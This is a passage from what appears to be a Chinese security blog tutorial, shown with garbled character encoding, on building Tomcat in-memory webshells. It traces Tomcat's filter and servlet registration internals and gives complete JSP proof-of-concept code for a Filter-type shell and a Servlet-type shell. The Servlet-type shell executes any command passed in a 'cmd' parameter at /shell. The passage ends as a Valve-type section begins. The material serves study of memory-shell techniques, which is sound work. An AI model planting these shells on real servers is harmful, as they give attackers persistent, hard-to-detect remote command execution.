            if (request.isAsyncSupported() &amp;&amp; !this.servletSupportsAsync) {
                request.setAttribute(&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;, Boolean.FALSE);
            }

            if (request instanceof HttpServletRequest &amp;&amp; response instanceof HttpServletResponse &amp;&amp; Globals.IS_SECURITY_ENABLED) {
                ServletRequest req = request;
                ServletResponse res = response;
                Principal principal = ((HttpServletRequest)req).getUserPrincipal();
                Object[] args = new Object[]{req, res};
                SecurityUtil.doAsPrivilege(&quot;service&quot;, this.servlet, classTypeUsedInService, args, principal);
            } else {
                this.servlet.service(request, response);
            }
        } catch (ServletException | RuntimeException | IOException var17) {
            Exception e = var17;
            throw e;
        } catch (Throwable var18) {
            Throwable e = var18;
            e = ExceptionUtils.unwrapInvocationTargetException(e);
            ExceptionUtils.handleThrowable(e);
            throw new ServletException(sm.getString(&quot;filterChain.servlet&quot;), e);
        } finally {
            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
                lastServicedRequest.set((Object)null);
                lastServicedResponse.set((Object)null);
            }

        }

    }
}
</code></pre>
<p>åœ¨è¿™é‡Œç¨å¾®äº†è§£ä¸€ä¸‹filterConfig</p>
<p>ä¸€ä¸ªfilterConfigå¯¹åº”ä¸€ä¸ªFilterï¼Œç”¨äºå­˜å‚¨Filterçš„ä¸Šä¸‹æ–‡ä¿¡æ¯</p>
<figure data-type="image" tabindex="13"><img src="https://bloyet.github.io/post-images/1752213966862.png" alt="" loading="lazy"></figure>
<p>å†å»çœ‹çœ‹filtersæ˜¯æ€ä¹ˆæ¥çš„</p>
<figure data-type="image" tabindex="14"><img src="https://bloyet.github.io/post-images/1752213966878.png" alt="" loading="lazy"></figure>
<p>è¿™é‡Œçš„<code>filters</code>å±æ€§æ˜¯ä¸€ä¸ªApplicationFilterConfigæ•°ç»„ã€‚ æˆ‘ä»¬ç›´æ¥å»è¿™ä¸ªæ•°ç»„é‡Œæ€ä¹ˆå‚¨å­˜Filterçš„ï¼Œå¾ˆéš¾æ‰¾åˆ°ï¼ˆè¿™é‡Œå…¶å®æ˜¯æœ‰ç‚¹éš¾ç†è§£çš„ï¼Œå…ˆè·Ÿç€å¤§ä½¬æ–‡ç« çœ‹å§ï¼‰æˆ‘è¿™é‡Œçš„åˆæ­¥ç†è§£æ˜¯å› ä¸ºè°ƒç”¨çš„ApplicationFilterChainæ‰€ä»¥è¦æ‰¾åˆ°ApplicationFilterChainçš„Filterï¼Œæˆ‘ä»¬å°±ç»§ç»­å¾€ä¸Šçœ‹è°ƒç”¨å¸§</p>
<p>StandardWrapperValve#invokeæ–¹æ³•ä¸­</p>
<figure data-type="image" tabindex="15"><img src="https://bloyet.github.io/post-images/1752213966894.png" alt="" loading="lazy"></figure>
<p>çœ‹çœ‹å®ƒæ˜¯æ€ä¹ˆæ¥çš„ï¼š</p>
<figure data-type="image" tabindex="16"><img src="https://bloyet.github.io/post-images/1752213966910.png" alt="" loading="lazy"></figure>
<p>æ­¥å…¥ApplicationFilterFactory.createFilterChainæ–¹æ³•ï¼š</p>
<pre><code class="language-java">public static ApplicationFilterChain createFilterChain(ServletRequest request,
            Wrapper wrapper, Servlet servlet) {
 
        ...
        // Request dispatcher in use
        filterChain = new ApplicationFilterChain();
 
        filterChain.setServlet(servlet);
        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
 
        // Acquire the filter mappings for this Context
        StandardContext context = (StandardContext) wrapper.getParent();
        FilterMap filterMaps[] = context.findFilterMaps();
 
        ...
 
        String servletName = wrapper.getName();
 
        // Add the relevant path-mapped filters to this filter chain
        for (FilterMap filterMap : filterMaps) {
            
            ...
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
                    context.findFilterConfig(filterMap.getFilterName());
            ...
 
            filterChain.addFilter(filterConfig);
        }
 
        ...
 
        // Return the completed filter chain
        return filterChain;
    }
</code></pre>
<p>åªçœ‹å…¶ä¸­å…³é”®ä»£ç ï¼š</p>
<pre><code class="language-java">é¦–å…ˆé€šè¿‡filterChain = new ApplicationFilterChain()åˆ›å»ºä¸€ä¸ªç©ºçš„filterChainå¯¹è±¡
ç„¶åé€šè¿‡wrapper.getParent()å‡½æ•°æ¥è·å–StandardContextå¯¹è±¡
æ¥ç€è·å–StandardContextä¸­çš„FilterMapså¯¹è±¡ï¼ŒFilterMapså¯¹è±¡ä¸­å­˜å‚¨çš„æ˜¯å„Filterçš„åç§°è·¯å¾„ç­‰ä¿¡æ¯
æœ€åæ ¹æ®Filterçš„åç§°ï¼Œåœ¨StandardContextä¸­è·å–FilterConfig
é€šè¿‡filterChain.addFilter(filterConfig)å°†ä¸€ä¸ªfilterConfigæ·»åŠ åˆ°filterChainä¸­
</code></pre>
<p>è¿™æ˜¯ä¸€å¥—å®Œæ•´çš„è°ƒç”¨é€»è¾‘äº†ï¼Œä½†æ˜¯æˆ‘ä»¬åº”è¯¥æ€ä¹ˆæŠŠæ¶æ„çš„Filteræ³¨å…¥å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬çœ‹åˆ°åˆšåˆšåˆ†æçš„æ—¶å€™ï¼Œæ˜¯åœ¨æœ€åçš„æ—¶å€™æŠŠfilterå–å‡ºæ¥è¿›è¡Œè°ƒç”¨ï¼Œåœ¨è¿™ä¹‹å‰éƒ½æ˜¯å°è£…åœ¨filterConfigä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€å¼€å§‹ä¹Ÿæ˜¯å¿…é¡»å¾—æŠŠæ¶æ„çš„filteræ”¾å…¥filterConfigä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æ¥çœ‹çœ‹å®ƒå…¶ä¸­çš„æ ¼å¼ï¼ˆè¿™é‡Œç›´æ¥çœ‹ä½¬çš„ï¼Œä¸æµªè´¹æ—¶é—´æ‰¾äº†ï¼‰ï¼š</p>
<h3 id="filteræ³¨å†Œåˆ†æ">Filteræ³¨å†Œåˆ†æ</h3>
<h4 id="standardcontext-2">StandardContext</h4>
<p>æˆ‘ä»¬èƒ½çœ‹åˆ°æ­¤æ—¶çš„ä¸Šä¸‹æ–‡å¯¹è±¡<code>StandardContext</code>å®é™…ä¸Šæ˜¯åŒ…å«äº†è¿™ä¸‰è€…çš„ï¼š</p>
<figure data-type="image" tabindex="17"><img src="https://bloyet.github.io/post-images/1752213966925.png" alt="" loading="lazy"></figure>
<h4 id="filterconfigs">filterConfigsï¼š</h4>
<p>å…¶ä¸­filterConfigsåŒ…å«äº†å½“å‰çš„ä¸Šä¸‹æ–‡ä¿¡æ¯<code>StandardContext</code>ã€ä»¥åŠ<code>filterDef</code>ç­‰ä¿¡æ¯</p>
<figure data-type="image" tabindex="18"><img src="https://bloyet.github.io/post-images/1752213966942.png" alt="" loading="lazy"></figure>
<h4 id="filterdef">filterDefï¼š</h4>
<p>å­˜æ”¾äº†filterçš„å®šä¹‰ï¼ŒåŒ…æ‹¬filterClassã€filterNameç­‰ä¿¡æ¯</p>
<figure data-type="image" tabindex="19"><img src="https://bloyet.github.io/post-images/1752213966957.png" alt="" loading="lazy"></figure>
<h4 id="filterdefs">filterDefs</h4>
<p>æ˜¯ä¸€ä¸ªHashMapï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨<code>filterDef</code></p>
<figure data-type="image" tabindex="20"><img src="https://bloyet.github.io/post-images/1752213966988.png" alt="" loading="lazy"></figure>
<h4 id="filtermaps">filterMaps</h4>
<p>ä»¥arrayçš„å½¢å¼å­˜æ”¾å„filterçš„è·¯å¾„æ˜ å°„ä¿¡æ¯</p>
<figure data-type="image" tabindex="21"><img src="https://bloyet.github.io/post-images/1752213966972.png" alt="" loading="lazy"></figure>
<p>å¿…è¦å±æ€§ï¼š<code>dispatcherMapping</code>ã€<code>filterName</code>ã€<code>urlPatterns</code></p>
<h3 id="æ³¨å†Œfilteræ€è·¯">æ³¨å†ŒFilteræ€è·¯</h3>
<ol>
<li>è·å–StandardContextå¯¹è±¡</li>
<li>åˆ›å»ºæ¶æ„Filter</li>
<li>ä½¿ç”¨FilterDefå¯¹Filterè¿›è¡Œå°è£…ï¼Œå¹¶æ·»åŠ å¿…è¦çš„å±æ€§</li>
<li>åˆ›å»ºfilterMapç±»ï¼Œå¹¶å°†è·¯å¾„å’ŒFilternameç»‘å®šï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterMapsä¸­</li>
<li>ä½¿ç”¨ApplicationFilterConfigå°è£…filterDefï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterConfigsä¸­</li>
</ol>
<h4 id="è·å–standardcontextå¯¹è±¡">è·å–StandardContextå¯¹è±¡</h4>
<p>StandardContextå¯¹è±¡ä¸»è¦ç”¨æ¥ç®¡ç†Webåº”ç”¨çš„ä¸€äº›å…¨å±€èµ„æºï¼Œå¦‚Sessionã€Cookieã€Servletç­‰ã€‚å› æ­¤æˆ‘ä»¬æœ‰å¾ˆå¤šæ–¹æ³•æ¥è·å–StandardContextå¯¹è±¡ã€‚</p>
<p>Tomcatåœ¨å¯åŠ¨æ—¶ä¼šä¸ºæ¯ä¸ªContextéƒ½åˆ›å»ºä¸ªServletContextå¯¹è±¡ï¼Œæ¥è¡¨ç¤ºä¸€ä¸ªContextï¼Œä»è€Œå¯ä»¥å°†ServletContextè½¬åŒ–ä¸ºStandardContextã€‚</p>
<pre><code class="language-java">//è·å–ApplicationContextFacadeç±»
ServletContext servletContext = request.getSession().getServletContext();
 
//åå°„è·å–ApplicationContextFacadeç±»å±æ€§contextä¸ºApplicationContextç±»
Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);
appContextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
 
//åå°„è·å–ApplicationContextç±»å±æ€§contextä¸ºStandardContextç±»
Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
standardContextField.setAccessible(true);
StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
</code></pre>
<figure data-type="image" tabindex="22"><img src="https://bloyet.github.io/post-images/1752213967003.png" alt="" loading="lazy"></figure>
<h4 id="1-åˆ›å»ºæ¶æ„filter">1. åˆ›å»ºæ¶æ„Filter</h4>
<pre><code class="language-java">public class CmdFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println(&quot;Filter åˆå§‹æ„é€ å®Œæˆ&quot;);
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        Runtime.getRuntime().exec(&quot;calc&quot;);
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {
        System.out.println(&quot;filter é”€æ¯&quot;);
    }
}
</code></pre>
<h4 id="filterdefå¯¹filterè¿›è¡Œå°è£…">FilterDefå¯¹Filterè¿›è¡Œå°è£…</h4>
<pre><code class="language-java">String name=&quot;filterShell&quot;;
FilterDef filterDef = new FilterDef();
filterDef.setFilter(new CmdFilter());
filterDef.setFilterClass(CmdFilter.class.getName());
filterDef.setFilterName(name);
context.addFilterDef(filterDef);
</code></pre>
<h4 id="åˆ›å»ºfiltermapç±»">åˆ›å»ºfilterMapç±»</h4>
<pre><code class="language-java">FilterMap filterMap = new FilterMap();
	filterMap.setFilterName(name);
	filterMap.setDispatcher(DispatcherType.REQUEST.name());
	filterMap.addURLPattern(&quot;/*&quot;);
	context.addFilterMap(filterMap);
</code></pre>
<h4 id="æ³¨å…¥åˆ°filterconfigsä¸­">æ³¨å…¥åˆ°filterConfigsä¸­</h4>
<p>è¿™é‡Œå› ä¸ºApplicationFilterConfigçš„æ„é€ æ–¹æ³•ä¸æ˜¯å…¬å…±çš„ï¼Œéœ€è¦åå°„æ¥è¿›è¡Œè°ƒç”¨</p>
<pre><code class="language-java">Field Configs = context.getClass().getDeclaredField(&quot;filterConfigs&quot;);
Configs.setAccessible(true);
Map filterConfigs = (Map) Configs.get(context);
Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context,filterDef);
filterConfigs.put(name, filterConfig);
</code></pre>
<h3 id="poc">POC</h3>
<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;
&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;
&lt;%@ page import=&quot;java.util.Map&quot; %&gt;
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
&lt;%!
    public class CmdFilter implements Filter {

        @Override
        public void init(FilterConfig filterConfig)  {
            System.out.println(&quot;shell&quot;);
        }

        @Override
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException, IOException {
            Runtime.getRuntime().exec(&quot;calc&quot;);
            chain.doFilter(request,response);
        }

        @Override
        public void destroy() {
        }
    }
%&gt;



&lt;%
    //è·å–ApplicationContextFacadeç±»
    ServletContext servletContext = request.getSession().getServletContext();

//åå°„è·å–ApplicationContextFacadeç±»å±æ€§contextä¸ºApplicationContextç±»
    Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);
    appContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);

//åå°„è·å–ApplicationContextç±»å±æ€§contextä¸ºStandardContextç±»
    Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
    standardContextField.setAccessible(true);
    StandardContext context = (StandardContext) standardContextField.get(applicationContext);
%&gt;

&lt;%
    String name=&quot;filtershell&quot;;
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(new CmdFilter());
    filterDef.setFilterClass(CmdFilter.class.getName());
    filterDef.setFilterName(name);
    context.addFilterDef(filterDef);
%&gt;

&lt;%
    FilterMap filterMap = new FilterMap();
    filterMap.setFilterName(name);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    filterMap.addURLPattern(&quot;/*&quot;);
    context.addFilterMap(filterMap);
%&gt;


&lt;%
    Field Configs = context.getClass().getDeclaredField(&quot;filterConfigs&quot;);
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(context);

    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context,filterDef);
    filterConfigs.put(name, filterConfig);
%&gt;
</code></pre>
<p>è¿˜æ˜¯ä¸€æ · å¾—å…ˆè®¿é—®jspæœ¨é©¬æ–‡ä»¶ï¼Œç„¶åå°±ä¼šè‡ªåŠ¨æ³¨å…¥è¿›å»ï¼Œæ³¨å…¥å®Œæ¯•ä¹‹ååœ¨æˆ‘ä»¬è®¿é—®èµ„æºä¹‹å‰å°±ä¼šè¿›è¡Œæ‹¦æˆªæ‰§è¡Œå‘½ä»¤</p>
<figure data-type="image" tabindex="23"><img src="https://bloyet.github.io/post-images/1752213967018.png" alt="" loading="lazy"></figure>
<h2 id="servletå‹">Servletå‹</h2>
<p>å…¶å®æ€è·¯éƒ½å·®ä¸å¤šï¼Œå°±æ˜¯çœ‹æ€ä¹ˆæŠŠæ¶æ„ç±»æ³¨å…¥åˆ°ä¸Šä¸‹æ–‡ä¸­ï¼Œæ¯ä¸€ç§ç±»å‹æ¶‰åŠçš„æ–¹æ³•ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æ³¨å…¥æ—¶è°ƒç”¨çš„æ–¹æ³•ä¹Ÿä¸ä¸€æ ·</p>
<h3 id="ç¼–å†™æ¶æ„servlet">ç¼–å†™æ¶æ„servlet</h3>
<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%!
    //jspå®šä¹‰æˆ–è€…å£°æ˜éœ€è¦åŠ ä¸Šï¼
    public class CmdServlet extends HttpServlet {
        @Override
        public void init(ServletConfig servletConfig){

        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
            if(cmd!=null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }

        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {

        }
    }
%&gt;
</code></pre>
<h3 id="æ³¨å…¥servletå†…å­˜é©¬">æ³¨å…¥servletå†…å­˜é©¬</h3>
<p>è¿™é‡Œå°±åªçœ‹ConfigContext#configureContextæ³¨å†ŒServletæµç¨‹è¿‡ç¨‹äº†ï¼Œå› ä¸ºæŒ‰ç…§é¡ºåºæ¥è¯´æ˜¯å…ˆlistener-filter-servlet</p>
<p>å…ˆå†™å‡ºå¤§è‡´æ­¥éª¤</p>
<pre><code class="language-java">ç”±ä¸Šä¸‹æ–‡contextåˆ›å»ºwrapperï¼Œç”¨æ¥åŒ…è£…servlet
è®¾ç½®Servletåç§°
è®¾ç½®Servletå…¨ç±»å
wrapoerè®¾ç½®servlet
å°†wrapperæ”¾å…¥context
æ·»åŠ urlè·¯å¾„æ˜ å°„
</code></pre>
<h4 id="åˆ›å»ºstandardwrapper">åˆ›å»ºStandardWrapper</h4>
<p>åœ¨<code>StandardContext</code>#<code>startInternal</code>ä¸­ï¼Œè°ƒç”¨äº†<code>fireLifecycleEvent()</code>æ–¹æ³•è§£æweb.xmlæ–‡ä»¶</p>
<figure data-type="image" tabindex="24"><img src="https://bloyet.github.io/post-images/1752213967033.png" alt="" loading="lazy"></figure>
<p>çœ‹çœ‹fireLifecycleEvent()æ–¹æ³•çš„å…·ä½“å®ç°ï¼š</p>
<pre><code class="language-java">protected void fireLifecycleEvent(String type, Object data) {
    LifecycleEvent event = new LifecycleEvent(this, type, data);
    Iterator i$ = this.lifecycleListeners.iterator();

    while(i$.hasNext()) {
        LifecycleListener listener = (LifecycleListener)i$.next();
        listener.lifecycleEvent(event);
    }

}
</code></pre>
<p>æœ€ç»ˆé€šè¿‡ContextConfig#webConfig()æ–¹æ³•è§£æweb.xmlè·å–å„ç§é…ç½®å‚æ•°,é‡Œé¢é€šè¿‡è°ƒç”¨configureContextæ–¹æ³•æ¥ä»contexté‡Œé¢è·å–web.xmlé‡Œé¢çš„ä¿¡æ¯</p>
<figure data-type="image" tabindex="25"><img src="https://bloyet.github.io/post-images/1752213967049.png" alt="" loading="lazy"></figure>
<p>è·å–åˆ°ä¿¡æ¯ä¹‹åï¼Œæ˜¯é€šè¿‡ContextConfig#addServletContainerInitializeræ¥æ·»åŠ </p>
<figure data-type="image" tabindex="26"><img src="https://bloyet.github.io/post-images/1752213967065.png" alt="" loading="lazy"></figure>
<p>é€šè¿‡<code>configureContext(webXml)</code>æ–¹æ³•åˆ›å»ºStandWrapperå¯¹è±¡ï¼Œå¹¶æ ¹æ®è§£æå‚æ•°åˆå§‹åŒ–StandWrapperå¯¹è±¡</p>
<pre><code class="language-java"> private void configureContext(WebXml webxml) {
        // As far as possible, process in alphabetical order so it is easy to
        // check everything is present
        // Some validation depends on correct public ID
        context.setPublicId(webxml.getPublicId());
 
...   //è®¾ç½®StandardContextå‚æ•°
 
        
        for (ServletDef servlet : webxml.getServlets().values()) {
 
            //åˆ›å»ºStandardWrapperå¯¹è±¡
            Wrapper wrapper = context.createWrapper();
 
            if (servlet.getLoadOnStartup() != null) {
 
                //è®¾ç½®LoadOnStartupå±æ€§
                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
            }
            if (servlet.getEnabled() != null) {
                wrapper.setEnabled(servlet.getEnabled().booleanValue());
            }
 
            //è®¾ç½®ServletNameå±æ€§
            wrapper.setName(servlet.getServletName());
            Map&lt;String,String&gt; params = servlet.getParameterMap();
            for (Entry&lt;String, String&gt; entry : params.entrySet()) {
                wrapper.addInitParameter(entry.getKey(), entry.getValue());
            }
            wrapper.setRunAs(servlet.getRunAs());
            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();
            for (SecurityRoleRef roleRef : roleRefs) {
                wrapper.addSecurityReference(
                        roleRef.getName(), roleRef.getLink());
            }
 
            //è®¾ç½®ServletClasså±æ€§
            wrapper.setServletClass(servlet.getServletClass());
            ...
            wrapper.setOverridable(servlet.isOverridable());
 
            //å°†åŒ…è£…å¥½çš„StandWrapperæ·»åŠ è¿›ContainerBaseçš„childrenå±æ€§ä¸­
            context.addChild(wrapper);
 
           for (Entry&lt;String, String&gt; entry :
                webxml.getServletMappings().entrySet()) {
          
            //æ·»åŠ è·¯å¾„æ˜ å°„
            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
        }
        }
        ...
    }
</code></pre>
<p>æœ€åé€šè¿‡<code>addServletMappingDecoded()</code>æ–¹æ³•æ·»åŠ Servletå¯¹åº”çš„urlæ˜ å°„</p>
<h4 id="åŠ è½½standwrapper">åŠ è½½StandWrapper</h4>
<p>åœ¨<code>StandardContext#startInternal</code>æ–¹æ³•é€šè¿‡<code>findChildren()</code>è·å–<code>StandardWrapper</code>ç±»</p>
<figure data-type="image" tabindex="27"><img src="https://bloyet.github.io/post-images/1752213967080.png" alt="" loading="lazy"></figure>
<p>æœ€åä¾æ¬¡åŠ è½½å®ŒListenerã€Filteråï¼Œå°±é€šè¿‡<code>loadOnStartUp()</code>æ–¹æ³•åŠ è½½wrapper</p>
<pre><code class="language-java">    public boolean loadOnStartup(Container children[]) {
 
        // Collect &quot;load on startup&quot; servlets that need to be initialized
        TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = new TreeMap&lt;&gt;();
        for (Container child : children) {
            Wrapper wrapper = (Wrapper) child;
            int loadOnStartup = wrapper.getLoadOnStartup();
 
            //åˆ¤æ–­å±æ€§loadOnStartupçš„å€¼
            if (loadOnStartup &lt; 0) {
                continue;
            }
            Integer key = Integer.valueOf(loadOnStartup);
            ArrayList&lt;Wrapper&gt; list = map.get(key);
            if (list == null) {
                list = new ArrayList&lt;&gt;();
                map.put(key, list);
            }
            list.add(wrapper);
        }
 
        // Load the collected &quot;load on startup&quot; servlets
        for (ArrayList&lt;Wrapper&gt; list : map.values()) {
            for (Wrapper wrapper : list) {
                try {
                    wrapper.load();
                }
</code></pre>
<p>æ³¨æ„è¿™é‡Œå¯¹äºWrapperå¯¹è±¡ä¸­<code>loadOnStartup</code>å±æ€§çš„å€¼è¿›è¡Œåˆ¤æ–­ï¼Œåªæœ‰å¤§äº0çš„æ‰ä¼šè¢«æ”¾å…¥listè¿›è¡Œåç»­çš„<code>wrapper.load()</code>åŠ è½½è°ƒç”¨ã€‚</p>
<p>è¿™é‡Œå¯¹åº”çš„å®é™…ä¸Šå°±æ˜¯Tomcat Servletçš„æ‡’åŠ è½½æœºåˆ¶ï¼Œå¯ä»¥é€šè¿‡<code>loadOnStartup</code>å±æ€§å€¼æ¥è®¾ç½®æ¯ä¸ªServletçš„å¯åŠ¨é¡ºåºã€‚é»˜è®¤å€¼ä¸º-1ï¼Œæ‰€ä»¥æ˜¯éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨ä¿®æ”¹çš„</p>
<p>æ€»ç»“ä¸€ä¸‹éœ€è¦å®Œæˆå“ªäº›ï¼š</p>
<pre><code class="language-java">è·å–StandardContextå¯¹è±¡
ç¼–å†™æ¶æ„Servlet
é€šè¿‡StandardContext.createWrapper()åˆ›å»ºStandardWrapperå¯¹è±¡
è®¾ç½®StandardWrapperå¯¹è±¡çš„loadOnStartupå±æ€§å€¼
è®¾ç½®StandardWrapperå¯¹è±¡çš„ServletNameå±æ€§å€¼
è®¾ç½®StandardWrapperå¯¹è±¡çš„ServletClasså±æ€§å€¼
å°†StandardWrapperå¯¹è±¡æ·»åŠ è¿›StandardContextå¯¹è±¡çš„childrenå±æ€§ä¸­
é€šè¿‡StandardContext.addServletMappingDecoded()æ·»åŠ å¯¹åº”çš„è·¯å¾„æ˜ å°„
</code></pre>
<p>è·å–StandardContextå¯¹è±¡ï¼š</p>
<pre><code class="language-java">&lt;%
    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
%&gt;
</code></pre>
<p>æ¶æ„ç±»ï¼š</p>
<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%!
    //jspå®šä¹‰æˆ–è€…å£°æ˜éœ€è¦åŠ ä¸Šï¼
    public class CmdServlet extends HttpServlet {
        @Override
        public void init(ServletConfig servletConfig){

        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
            if(cmd!=null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }

        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {

        }
    }
%&gt;
</code></pre>
<p>åˆ›å»ºStandardWrapperå¯¹è±¡</p>
<pre><code class="language-java">&lt;%
    CmdServlet cmdServlet = new CmdServlet();
    String name = cmdServlet.getClass().getSimpleName();
 
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServlet(cmdServlet);
    wrapper.setServletClass(cmdServlet.getClass().getName());
%&gt;
</code></pre>
<p>æ·»åŠ è¿›ä¸Šä¸‹æ–‡ï¼š</p>
<pre><code class="language-java">&lt;%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);
%&gt;
</code></pre>
<h3 id="poc-2">POC</h3>
<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;
&lt;%!
    //jspå®šä¹‰æˆ–è€…å£°æ˜éœ€è¦åŠ ä¸Šï¼
    public class CmdServlet extends HttpServlet {
        @Override
        public void init(ServletConfig servletConfig){

        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
            if(cmd!=null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }

        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {

        }
    }
%&gt;

&lt;%
    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
%&gt;

&lt;%
    CmdServlet cmdServlet = new CmdServlet();
    String name = cmdServlet.getClass().getSimpleName();

    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServlet(cmdServlet);
    wrapper.setServletClass(cmdServlet.getClass().getName());
%&gt;

&lt;%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);
%&gt;
</code></pre>
<p>å¾—å…ˆè®¿é—®jspæ–‡ä»¶ åŠ è½½è¿›å»ä¹‹ååœ¨å¯¹åº”çš„è·¯å¾„ä¸‹æ‰§è¡Œå‘½ä»¤</p>
<figure data-type="image" tabindex="28"><img src="https://bloyet.github.io/post-images/1752213967096.png" alt="" loading="lazy"></figure>
<h2 id="valveå‹">Valveå‹</h2>
<p>å…ˆå­¦ä¹ ä¸€ä¸‹ä»€ä¹ˆæ˜¯Valve</p>
<p>æˆ‘ä»¬å…ˆæ¥ç®€å•äº†è§£ä¸€ä¸‹Tomcatä¸­çš„<code>ç®¡é“æœºåˆ¶</code></p>
<p>æˆ‘ä»¬çŸ¥é“ï¼Œå½“Tomcatæ¥æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼Œé¦–å…ˆä¼šä½¿ç”¨<code>Connector</code>è¿›è¡Œè§£æï¼Œç„¶åå‘é€åˆ°<code>Container</code>è¿›è¡Œå¤„ç†ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„æ¶ˆæ¯åˆæ˜¯æ€ä¹ˆåœ¨å››ç±»å­å®¹å™¨ä¸­å±‚å±‚ä¼ é€’ï¼Œæœ€ç»ˆé€åˆ°Servletè¿›è¡Œå¤„ç†çš„å‘¢ï¼Ÿè¿™é‡Œæ¶‰åŠåˆ°çš„æœºåˆ¶å°±æ˜¯Tomcatç®¡é“æœºåˆ¶ã€‚</p>
